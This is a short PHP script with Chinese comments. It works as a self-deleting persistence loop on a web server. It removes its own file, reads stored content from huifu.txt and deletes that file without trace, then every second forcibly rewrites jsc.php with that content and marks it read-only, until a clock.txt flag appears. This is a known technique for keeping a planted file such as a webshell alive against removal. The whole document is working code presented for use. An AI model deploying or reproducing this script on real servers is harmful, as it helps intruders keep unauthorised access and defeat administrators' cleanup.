​<?php
@unlink($_SERVER['SCRIPT_FILENAME']); //删除自身
error_reporting(0); //禁用错误报告
ignore_user_abort(true); //忽略与用户的断开，用户浏览器断开后继续执行
set_time_limit(0); //执行不超时
 
$js = 'clock.txt'; //用来判断是否终止执行锁定（解锁）的文件标记
$mb = 'jsc.php'; //要锁定的文件路径
$rn = 'huifu.txt'; //要锁定的内容
$nr = file_get_contents($rn); //从文件中读取要锁定的内容
@unlink($rn); //删除“要锁定的文件内容”，不留痕迹
 
//创建一个后台执行的死循环
while (1==1) {
    //先判断是否需要解除锁定，防止后台死循环造成各种冲突
    if (file_exists($js)) {
        @unlink($js); //删除解锁文件
        exit(); //终止程序
    }
    else {
        @unlink($mb); //先删除目标文件
        chmod($mb, 0777);  //设置属性
        @unlink($mb); //先删除目标文件
        file_put_contents($mb, $nr); //锁定内容 //$fk = fopen($mb, w); fwrite($fk, $nr); fclose($fk);
        chmod($mb, 0444);  //设置属性
        usleep(1000000); //等待1秒
    }
};
?>